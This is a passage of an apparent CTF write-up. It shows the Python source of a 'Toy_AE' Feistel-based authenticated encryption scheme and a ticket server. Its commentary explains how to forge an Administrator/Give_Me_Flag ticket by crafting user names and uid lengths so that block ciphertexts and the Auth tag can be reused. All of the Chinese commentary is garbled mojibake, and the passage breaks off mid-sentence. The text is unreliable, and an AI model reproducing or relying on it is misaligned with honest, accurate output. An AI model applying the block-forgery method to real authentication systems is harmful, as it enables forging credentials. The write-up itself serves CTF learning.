class="keyword">strxor(self.cipher.encrypt(strxor(M1, </span><span class="keyword">self.L)), </span>M2)</span><br><span class="line">        <span class="built_in">C2</span> = <span class="keyword">strxor(self.cipher.encrypt(strxor(C1, </span><span class="keyword">strxor(self.L, </span><span class="keyword">self.delta))), </span>M1)</span><br><span class="line">        return <span class="built_in">C1</span>, <span class="built_in">C2</span></span><br><span class="line"></span><br><span class="line">    def feistel_dec_2r(<span class="keyword">self, </span><span class="built_in">C1</span>, <span class="built_in">C2</span>):</span><br><span class="line">        M1 = <span class="keyword">strxor(self.cipher.encrypt(strxor(C1, </span><span class="keyword">strxor(self.L, </span><span class="keyword">self.delta))), </span><span class="built_in">C2</span>)</span><br><span class="line">        M2 = <span class="keyword">strxor(self.cipher.encrypt(strxor(M1, </span><span class="keyword">self.L)), </span><span class="built_in">C1</span>)</span><br><span class="line">        return M1, M2</span><br></pre></td></tr></table></figure><p>task.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Toy_AE <span class="keyword">import</span> Toy_AE</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">    proof = <span class="string">b''</span>.join([random.choice(string.ascii_letters + string.digits).encode() <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">20</span>)])</span><br><span class="line">    digest = sha256(proof).hexdigest().encode()</span><br><span class="line">    print(<span class="string">"sha256(XXXX+%s) == %s"</span> % (proof[<span class="number">4</span>:],digest))</span><br><span class="line">    print(<span class="string">"Give me XXXX:"</span>)</span><br><span class="line">    x = input().encode()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span> <span class="keyword">if</span> len(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x + proof[<span class="number">4</span>:]).hexdigest().encode() != digest <span class="keyword">else</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack</span><span class="params">(uid, uname, token, cmd, appendix)</span>:</span></span><br><span class="line">    r = <span class="string">b''</span></span><br><span class="line">    r += <span class="string">b'Uid=%d\xff'</span> % uid</span><br><span class="line">    r += <span class="string">b'UserName=%s\xff'</span> % uname</span><br><span class="line">    r += <span class="string">b'T=%s\xff'</span> % token</span><br><span class="line">    r += <span class="string">b'Cmd=%s\xff'</span> % cmd</span><br><span class="line">    r += appendix</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpack</span><span class="params">(r)</span>:</span></span><br><span class="line">    data = r.split(<span class="string">b"\xff"</span>)</span><br><span class="line">    uid, uname, token, cmd, appendix = int(data[<span class="number">0</span>][<span class="number">4</span>:]), data[<span class="number">1</span>][<span class="number">9</span>:], data[<span class="number">2</span>][<span class="number">2</span>:], data[<span class="number">3</span>][<span class="number">4</span>:], data[<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> (uid, uname, token, cmd, appendix)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">apply_ticket</span><span class="params">()</span>:</span></span><br><span class="line">    uid = int(input(<span class="string">"Set up your user id:"</span>)[:<span class="number">5</span>])</span><br><span class="line">    uname = input(<span class="string">"Your username:"</span>).encode(<span class="string">"ascii"</span>)[:<span class="number">16</span>]</span><br><span class="line">    <span class="keyword">if</span> uname == <span class="string">b"Administrator"</span>:</span><br><span class="line">        print(<span class="string">"Sorry, preserved username."</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    token = sha256(uname).hexdigest()[:max(<span class="number">8</span>, uid % <span class="number">16</span>)].encode(<span class="string">"ascii"</span>)</span><br><span class="line">    cmd = input(<span class="string">"Your command:"</span>).encode(<span class="string">"ascii"</span>)[:<span class="number">16</span>]</span><br><span class="line">    <span class="keyword">if</span> cmd == <span class="string">b"Give_Me_Flag"</span>:</span><br><span class="line">        print(<span class="string">"Not allowed!"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    appendix = input(<span class="string">"Any Appendix?"</span>).encode(<span class="string">"ascii"</span>)[:<span class="number">16</span>]</span><br><span class="line">    msg = pack(uid, uname, token, cmd, appendix)</span><br><span class="line">    ct, te = ae.encrypt(msg)</span><br><span class="line">    print(<span class="string">"Your ticket:%s"</span> % ct.hex())</span><br><span class="line">    print(<span class="string">"With my Auth:%s"</span> % te.hex())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_ticket</span><span class="params">()</span>:</span></span><br><span class="line">    ct = bytes.fromhex(input(<span class="string">"Ticket:"</span>))</span><br><span class="line">    te = bytes.fromhex(input(<span class="string">"Auth:"</span>))</span><br><span class="line">    msg = ae.decrypt(ct, te)</span><br><span class="line">    <span class="keyword">assert</span> msg</span><br><span class="line">    uid, uname, token, cmd, appendix = unpack(msg)</span><br><span class="line">    <span class="keyword">if</span> uname == <span class="string">b"Administrator"</span> <span class="keyword">and</span> cmd == <span class="string">b"Give_Me_Flag"</span>:</span><br><span class="line">        print(FLAG)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Nothing happend."</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"Menu:"</span>)</span><br><span class="line">    print(<span class="string">"[1] Apply Ticket"</span>)</span><br><span class="line">    print(<span class="string">"[2] Check Ticket"</span>)</span><br><span class="line">    print(<span class="string">"[3] Exit"</span>)</span><br><span class="line">    op = int(input(<span class="string">"Your option:"</span>))</span><br><span class="line">    <span class="keyword">assert</span> op <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> op == <span class="number">1</span>:</span><br><span class="line">        apply_ticket()</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">2</span>:</span><br><span class="line">        check_ticket()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Bye!"</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    ae = Toy_AE()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit(<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            menu()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            exit(<span class="number">-1</span>)</span><br></pre></td></tr></table></figure><p>å¯æ¶ï¼Œæœç„¶æ˜¯è¿™æ ·å—ã€‚ã€‚ä¸åªä»£ç é•¿ï¼Œç”šè‡³é™„ä»¶éƒ½æœ‰ä¿©ã€‚å®³ï¼Œæ…¢æ…¢å•ƒå’¯ã€‚ã€‚ã€‚å…ˆä¸ç®¡è¿™ä¸ªåŠ å¯†çš„å…·ä½“æ˜¯å•¥ï¼Œæ¥çœ‹çœ‹åŠŸèƒ½æ˜¯å•¥å­ã€‚ç¨‹åºæœ‰ä¿©åŠŸèƒ½ï¼Œæä¾›ticketï¼Œå’Œæ£€æŸ¥ticketï¼Œè·å–flagçš„ç‚¹åœ¨æ£€æŸ¥ticketï¼Œ</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def decrypt(self, <span class="keyword">ct</span>, _te):</span><br><span class="line">msg, <span class="keyword">te</span> = self.A_DF(<span class="keyword">ct</span>)</span><br><span class="line"><span class="keyword">return</span> msg <span class="keyword">if</span> _te == <span class="keyword">te</span> <span class="keyword">else</span> None</span><br><span class="line"></span><br><span class="line">msg = ae.decrypt(<span class="keyword">ct</span>, <span class="keyword">te</span>)</span><br><span class="line"><span class="keyword">assert</span> msg</span><br><span class="line">uid, uname, <span class="keyword">token</span>, cmd, appendix = unpack(msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> uname == b<span class="string">"Administrator"</span> and cmd == b<span class="string">"Give_Me_Flag"</span>:</span><br><span class="line"><span class="keyword">print</span>(FLAG)</span><br></pre></td></tr></table></figure><p>è¦æ±‚ä½ çš„è¿™ä¸ªticketä»£è¡¨çš„ä¿¡æ¯æ˜¯ï¼Œç”¨æˆ·åæ˜¯Administratorï¼Œè¦æ‰§è¡Œçš„å‘½ä»¤æ˜¯Give_Me_Flagï¼Œå¹¶ä¸”è¿˜è¦æä¾›è¿™ä¸ªticketçš„ç­¾åAuthæ¥ä¿è¯ä»–çš„åˆæ³•æ€§ã€‚</p><p>å†æ¥çœ‹çœ‹è¿™ä¸ªæä¾›ticketæœ‰å•¥ï¼Œ</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def apply_ticket():</span><br><span class="line">    uid = int(<span class="keyword">input</span>(<span class="string">"Set up your user id:"</span>)[:5])</span><br><span class="line">    uname = <span class="keyword">input</span>(<span class="string">"Your username:"</span>).<span class="keyword">encode</span>(<span class="string">"ascii"</span>)[:16]</span><br><span class="line">    <span class="keyword">if</span> uname == b<span class="string">"Administrator"</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"Sorry, preserved username."</span>)</span><br><span class="line">        #<span class="built_in">return</span></span><br><span class="line">    <span class="keyword">token</span> = sha256(uname).hexdigest()[:<span class="built_in">max</span>(8, uid % 16)].<span class="keyword">encode</span>(<span class="string">"ascii"</span>)</span><br><span class="line">    cmd = <span class="keyword">input</span>(<span class="string">"Your command:"</span>).<span class="keyword">encode</span>(<span class="string">"ascii"</span>)[:16]</span><br><span class="line">    <span class="keyword">if</span> cmd == b<span class="string">"Give_Me_Flag"</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"Not allowed!"</span>)</span><br><span class="line">        #<span class="built_in">return</span></span><br><span class="line">    appendix = <span class="keyword">input</span>(<span class="string">"Any Appendix?"</span>).<span class="keyword">encode</span>(<span class="string">"ascii"</span>)[:16]</span><br><span class="line">    msg = pack(uid, uname, <span class="keyword">token</span>, cmd, appendix)</span><br></pre></td></tr></table></figure><p>ä»–è¦æ±‚ä½ æä¾›ï¼Œuidï¼Œç”¨æˆ·åï¼Œcmdï¼Œå’Œé¢å¤–çš„å¯é€‰æ‹©çš„ä¿¡æ¯ã€‚å…¶ä¸­ï¼Œç”¨æˆ·åä¸èƒ½ç­‰äºAdministratorï¼Œcmdä¸èƒ½ç­‰äºGive_Me_Flagã€‚ï¼ˆä¸ç„¶è¿™é¢˜ç›´æ¥å°±æ²¡äº†ã€‚ï¼‰ç„¶åä»–ä¼šç”Ÿæˆä¸€ä¸ªä½ çš„ç”¨æˆ·åçš„sha256çš„æ‘˜è¦ï¼Œè‡³äºå­˜å¤šå°‘é•¿è¯»è¿›ä½ çš„messageå‘¢ï¼Œç”±ä½ çš„uidæ¥å†³å®šã€‚</p><p><code>token = sha256(uname).hexdigest()[:max(8, uid % 16)].encode(&quot;ascii&quot;)</code></p><p>ç„¶åä¸€äº›é™åˆ¶æ˜¯ï¼Œé™¤äº†uidæœ€å¤§ä¸º5ä½æ•°å­—ä¹‹å¤–ï¼Œå…¶ä½™è¾“å…¥æœ€å¤šåªèƒ½16ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”æ¯ä¸ªå­—ç¬¦çš„asciiéƒ½å¾—åœ¨0-128ä¹‹é—´ï¼ˆç”±decode(â€˜asciiâ€™)é™åˆ¶ï¼‰ã€‚ï¼ˆä¸ç„¶ä½ è¦æ˜¯è¾“å…¥\xffï¼Œè¿™é¢˜ä¹Ÿç›´æ¥å°±æ²¡äº†ï¼‰</p><p>æ‰€ä»¥é¢˜ç›®æ„æ€å¾ˆæ˜ç¡®ï¼Œä½ è¦ä¼ªé€ å¯†æ–‡ï¼Œå¹¶ä¸”è¿˜è¦èƒ½å¤Ÿæ„é€ å¯¹åº”çš„ç­¾åæ¥é€šè¿‡åˆæ³•æ€§éªŒè¯ã€‚è®©ä»–è§£å¯†ä¿¡æ¯åç”¨æˆ·åä¸ºAdministratorï¼Œcmdä¸ºGive_Me_Flagã€‚ç„¶åç”±äºå¯¹è¾“å…¥åšçš„è¯¸å¤šé™åˆ¶ï¼Œï¼ˆç”šè‡³ä¸€æ¬¡è¿æ¥åªèƒ½äº¤äº’4æ¬¡ï¼Œé™¤å»ä¸€æ¬¡æ¥è·å–flagï¼Œåªèƒ½äº¤äº’ä¸‰æ¬¡ï¼Œä¸‹ä¸€æ¬¡è¿æ¥å°±ç”Ÿæˆæ–°çš„Toy_AEå¯¹è±¡ï¼Œç”Ÿæˆæ–°çš„keyäº†ï¼‰å¯¼è‡´æ¼æ´ç‚¹å¤§æ¦‚ç‡ä¸ä¼šå‡ºç°åœ¨è¿™ä¸ªtaskæ–‡ä»¶ä¸­ï¼Œï¼Œé‚£å°±è¦æ‰¾è¿™ä¸ªToy_AEç®—æ³•çš„æ´äº†ã€‚ï¼ˆå•Šï¼Œå¥½é•¿ï¼Œä¸æƒ³çœ‹ï¼‰</p><p>ä¸€ç‚¹ç‚¹å•ƒå­ï¼Œå…ˆå¤§è‡´éšä¾¿çœ‹çœ‹ï¼Œç„¶åæˆ‘ä»¬æœ‰ç›®çš„æ€§çš„å…ˆæ¥çœ‹çœ‹ç”ŸæˆAuthçš„è¿‡ç¨‹ã€‚ï¼ˆå•ç‹¬æ‹å‡ºæ¥ä¼šæ¸…æ™°äº›ï¼‰</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">self</span>.Sigma = b<span class="string">'\x00'</span> * <span class="keyword">self</span>.n_size</span><br><span class="line"><span class="keyword">self</span>.Sigma = strxor(M_list[<span class="number">2</span>*i +<span class="number">1</span>], <span class="keyword">self</span>.Sigma)</span><br><span class="line"><span class="keyword">if</span> ç»„æ•°ä¸ºå¶æ•°ï¼š</span><br><span class="line">Z = <span class="keyword">self</span>.cipher.encrypt(strxor(<span class="keyword">self</span>.L, M_list[-<span class="number">2</span>]))</span><br><span class="line">Cm  =  strxor(Z[<span class="symbol">:len</span>(M_list[-<span class="number">1</span>])], M_list[-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">self</span>.Sigma = strxor(<span class="keyword">self</span>.Sigma, strxor(Z, <span class="keyword">self</span>.pad(Cm, <span class="keyword">self</span>.block_size)))</span><br><span class="line"><span class="symbol">else:</span></span><br><span class="line"><span class="keyword">self</span>.Sigma = strxor(<span class="keyword">self</span>.Sigma, <span class="keyword">self</span>.pad(M_list[-<span class="number">1</span>], <span class="keyword">self</span>.n_size))</span><br><span class="line">TE = <span class="keyword">self</span>.cipher.encrypt(strxor(<span class="keyword">self</span>.Sigma, multer))</span><br><span class="line">TE = <span class="keyword">self</span>.cipher.encrypt(strxor(<span class="keyword">self</span>.Sigma, multer))</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœç»„æ•°ä¸ºå¶æ•°ï¼Œå°±ä¼šå¤šç”Ÿæˆä¸€ä¸ªZï¼Œè€Œä¸”ç”Ÿæˆçš„å¯†æ–‡æ–¹å¼ä¹Ÿä¼šæ¯”è¾ƒéº»çƒ¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å…ˆåˆ©ç”¨é‚£ä¸ªé™„åŠ ä¿¡æ¯æ¥æ§åˆ¶ç»„æ•°ï¼Œå°½é‡é¿å…è¿™ä¸ªéº»çƒ¦çš„ä¸œè¥¿ã€‚</p><p>è¿™æ ·å­çš„è¯Sigmaç¬¬2å—ã€ç¬¬4å—æ˜æ–‡ã€å¡«å……åçš„ç¬¬5å—æ˜æ–‡çš„å¼‚æˆ–ï¼Œç„¶åå’Œmulter</p><figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> len(M_list[-<span class="number">1</span>]) == <span class="built_in">self</span>.n_size:</span><br><span class="line">multer = strxor(long_to_bytes(<span class="built_in">self</span>.GF2_mul(<span class="number">3</span>, bytes_to_long(<span class="built_in">self</span>.L), <span class="built_in">self</span>.n_size)), <span class="built_in">self</span>.delta)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">multer = long_to_bytes(<span class="built_in">self</span>.GF2_mul(<span class="number">3</span>, bytes_to_long(<span class="built_in">self</span>.L), <span class="built_in">self</span>.n_size))</span><br></pre></td></tr></table></figure><p>ï¼ˆmulterå’ŒLæœ‰å…³ï¼Œä¸å¯çŸ¥ï¼Œé‚£å°±ä¸ç®¡äº†ï¼‰å¼‚æˆ–ï¼Œæœ€åAESåŠ å¯†ï¼Œè¿”å›å¯†æ–‡ã€‚</p><p>ç”±äºAESçš„keyä¹Ÿä¸å¯çŸ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³è¦æ‹¿åˆ°Authï¼Œæ²¡åˆ«çš„æ–¹æ³•äº†ã€‚åªèƒ½åœ¨ä¼ æ˜æ–‡è·å–Authæ—¶ï¼Œè®©æˆ‘ä»¬çš„msgçš„ç¬¬äºŒå—å’Œç¬¬å››å—å’Œç¬¬äº”å—å’ŒçœŸæ­£çš„èƒ½æ‹¿åˆ°FLAGçš„msgçš„æ˜æ–‡ä¿æŒä¸€è‡´äº†ã€‚</p><p>è¿™é‡Œä¸€ä¸ªåšæ³•å°±æ˜¯ï¼Œæœ¬åœ°è·‘è¿™ä¸ªç¨‹åºï¼ŒæŠŠé‚£äº›éº»çƒ¦çš„PoWå•¥çš„å»å»æ‰ï¼Œä¸€äº›é™åˆ¶ï¼ˆæ¯”å¦‚ç”¨æˆ·åä¸èƒ½æ˜¯Administratorï¼‰ä¹Ÿå»å»æ‰ï¼Œç„¶åæ‰“å°ä¸€äº›æ–¹ä¾¿æˆ‘ä»¬å®¡è®¡çš„ä¿¡æ¯ï¼Œï¼ˆå½“ç„¶ï¼Œç†Ÿç”¨é‚£ç§è‡ªå¸¦debugç¼–è¯‘å™¨çš„å¤§ä½¬å¯ä»¥å¿½ç•¥ï¼ŒIDLEé€‰æ‰‹è¿˜æ˜¯æ¯”è¾ƒå–œæ¬¢print debugå¤§æ³•ï¼‰</p><p>é‚£å°±æ˜¯æ€ä¹ˆä¼ªé€ å¯†æ–‡äº†ã€‚</p><p>å…ˆçœ‹çœ‹å¯†æ–‡çš„ç”Ÿæˆ</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">C1</span>, <span class="built_in">C2</span> = <span class="keyword">self.feistel_enc_2r(M_list[2*i], </span>M_list[<span class="number">2</span>*i +<span class="number">1</span>])</span><br><span class="line"><span class="symbol">def</span> feistel_enc_2r(<span class="keyword">self, </span>M1, M2):</span><br><span class="line">        <span class="built_in">C1</span> = <span class="keyword">strxor(self.cipher.encrypt(strxor(M1, </span><span class="keyword">self.L)), </span>M2)</span><br><span class="line">        <span class="built_in">C2</span> = <span class="keyword">strxor(self.cipher.encrypt(strxor(C1, </span><span class="keyword">strxor(self.L, </span><span class="keyword">self.delta))), </span>M1)</span><br><span class="line">        return <span class="built_in">C1</span>, <span class="built_in">C2</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æŠŠæ˜æ–‡å’Œå¯†æ–‡çœ‹æˆ16å­—èŠ‚ä¸€å—ï¼Œä¸¤å—ä¸€ç»„ï¼Œä¸¤å—æ˜æ–‡å¯¹è‡ªå·±è¿™ç»„ç”Ÿæˆçš„å¯†æ–‡æœ‰å½±å“ï¼Œä½†æ¯ç»„æ˜æ–‡é—´çš„åŠ å¯†æ˜¯ç‹¬ç«‹çš„ã€‚ä¹Ÿå°±æ˜¯ç¬¬ä¸€ç»„ï¼ˆç¬¬ä¸€äºŒå—ï¼‰æ˜æ–‡ä¸å½±å“ç¬¬äºŒç»„ï¼ˆç¬¬ä¸‰å››å—ï¼‰æ˜æ–‡ç”Ÿæˆçš„ç¬¬äºŒå—å¯†æ–‡ã€‚</p><p>é‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬çš„uidæ˜¯1ï¼Œç”¨æˆ·åæ˜¯Administratorï¼Œcmdæ˜¯Give_Me_Flagï¼Œä¸åŠ ä¿¡æ¯ï¼Œ</p><p>ï¼ˆæœ¬åœ°èµ·è¿™ä¸ªç¨‹åºï¼ŒæŠŠç”¨æˆ·åå’Œcmdçš„é™åˆ¶ç»™å–æ¶ˆæ‰ï¼Œç„¶åæ‰“å°ä¸€ä¸‹M_listï¼‰</p><p><img src="https://i.loli.net/2020/12/17/eR1q9kg6OMVJhfZ.png" alt="image-20201102204318891"></p><p>æˆ‘ä»¬ä¼šç”Ÿæˆ4å—æ˜æ–‡ï¼Œ<code>[b&#39;Uid=1\xffUserName=A&#39;, b&#39;dministrator\xffT=e&#39;, b&#39;7d3e769\xffCmd=Give&#39;, b&#39;_Me_Flag\xff&#39;]</code></p><p>å‰é¢è¯´äº†ï¼Œä¸ºäº†è®©ç”Ÿæˆçš„Authä¾¿äºè®¡ç®—ï¼Œæˆ‘ä»¬è¦åŠ å…¥é™„åŠ ä¿¡æ¯ï¼ˆAppendixï¼‰æ¥æ§åˆ¶æ˜æ–‡ç»„æ•°ã€‚</p><p>ä½†è¿™é‡Œå…ˆçœ‹çœ‹M_listå­ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦å¾—åˆ°Authï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—ä¿è¯æˆ‘ä»¬æ„é€ çš„ç”¨æˆ·åå’Œcmdåœ¨ä¸ç­‰äºé™å®šå€¼çš„æƒ…å†µä¸‹ï¼ŒM_listçš„ç¬¬äºŒç»„å’Œç¬¬å››ç»„ä¸ç”¨æˆ·åä¸ºAdministratorå’Œcmdä¸ºGive_Me_Flagæ—¶çš„M_listçš„ç›¸åº”åˆ†ç»„ç›¸åŒã€‚</p><p>è¿™æ ·å­çœ‹è¿‡å»ï¼Œå¯¹äºæˆ‘ä»¬ç›®å‰å¾—åˆ°çš„è¿™ä¸ªM_listæ˜¯å¾ˆå¥½æ„é€ çš„ï¼Œç”±äºAdministratorçš„Aåœ¨ç¬¬ä¸€ç»„ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ³¨å†ŒBdministratorï¼›ç”±äºGive_Me_Flagçš„Giveåœ¨ç¬¬ä¸‰ç»„ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ³¨å†Œgive_Me_Flagå°±å¥½äº†ã€‚ç„¶ååŠ ä¸€åŠ Appendixæ§åˆ¶ä¸‹ç»„æ•°ã€‚ä½†æ˜¯æ³¨æ„åˆ°ç¬¬äºŒç»„æœ€åä¸€ä½æ˜¯sha256çš„é¦–ä½ï¼Œè€Œæˆ‘ä»¬è¦æ˜¯åŠ¨äº†ç”¨æˆ·åï¼Œè¿™ä¸ªå€¼å¤§æ¦‚ç‡ä¹Ÿæœ‰å˜ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜å¾—æ§åˆ¶è¿™ä¸ªç”¨æˆ·åçš„é¦–ä½ï¼Œå¯èƒ½ä¸èƒ½æ˜¯Bï¼Œæˆ‘ä»¬å°±åœ¨ascii ä¸º0åˆ°128ä¹‹é—´æ‰¾ä¸€ä¸ªå­—ç¬¦*ï¼Œè®©*dministratorçš„sha256çš„é¦–ä½ä¸ºeå°±å¯ä»¥äº†ã€‚ç»è¿‡æµ‹è¯•ï¼Œå­—ç¬¦â€˜Pâ€™å°±æ˜¯ä¸€ä¸ªåˆé€‚çš„å€¼</p><p><img src="https://i.loli.net/2020/12/17/tcLqimUel4NXygV.png" alt="image-20201102234733848"></p><p>çœ‹ï¼Œä¸Šé¢æ˜¯ç›®æ ‡Authï¼Œä¸‹é¢æ˜¯æˆ‘ä»¬ä¼ªé€ çš„ç”¨æˆ·åå’Œcmdè·å–çš„Authï¼Œä»–ä»¬æ˜¯ä¸€è‡´çš„ã€‚æ‰€ä»¥Authè¿™ä¸€å…³è¿‡äº†ã€‚é‚£å°±åªå‰©ä¸‹å¯†æ–‡çš„ä¼ªé€ äº†ã€‚</p><p>å¯¹äºç¬¬ä¸€ç»„ï¼Œæ˜¯ç”±uidå’Œç”¨æˆ·åå†³å®šçš„ã€‚å…¶ä¸­uidä¸ç”¨ä¼ªé€ ï¼Œé—®é¢˜ä¸å¤§ï¼Œä½†æ˜¯ç”¨æˆ·åçš„å¯†æ–‡å’‹åŠï¼Œæˆ‘ä»¬ç”¨æˆ·åä¸èƒ½ç­‰äºAdministratorï¼Œä½†æ˜¯åˆè¦æåˆ°çš„Administratorçš„å¯†æ–‡ã€‚</p><p>è¿™é‡Œç”¨åˆ°çš„ç¬¬ä¸€æŠ€å·§å°±æ˜¯ï¼Œå¢åŠ uidçš„é•¿åº¦ï¼Œåæ­£uidæœ€åæ¨¡16äº†ï¼Œæˆ‘ä»¬æ§åˆ¶uidé•¿åº¦ä¸º5ï¼Œç”¨æˆ·åä¸ºAdministratorrï¼ˆå¤šäº†ä¸€ä¸ªrï¼‰ï¼Œè¿™æ ·å­å¯¹ç…§ä¸€ä¸‹ï¼Œ</p><p><img src="https://i.loli.net/2020/12/17/mdSovXRN5ZuQqgF.png" alt="image-20201102235135632"></p><p>å¯ä»¥å‘ç°ï¼Œå¤šå‡ºæ¥çš„é‚£ä¸ªræ­£å¥½è¢«æŒ¤åˆ°ç¬¬ä¸‰ç»„å»äº†ï¼Œè¿™æ ·å­æˆ‘ä»¬çš„ç”¨æˆ·åæ—¢æ²¡æœ‰ç­‰äºAdministratorï¼Œä½†æ˜¯åˆè·å¾—äº†å‰ä¸¤å—å±äºAdministratorçš„msgçš„å¯†æ–‡ã€‚</p><p>okã€‚ä¸€åŠçš„å·¥ä½œå®Œæˆã€‚</p><p>ç¬¬äºŒç»„ï¼Œç”±äºuidé‚£ä¹ˆæ„é€ äº†ï¼Œé‚£ä¹ˆç¬¬äºŒç»„æ˜æ–‡å°±æ˜¯è¿™æ ·å­çš„ï¼Œ<code>b&#39;r\xffT=ab86207b\xffCmd&#39;, b&#39;=Give_Me_Flag\xff</code>ç”±hashå’Œcmdå’Œç»„æˆï¼ˆè¿™é‡Œåªæ˜¯æµ‹è¯•ï¼Œé™„åŠ ä¿¡æ¯å°±å…ˆä¸åŠ 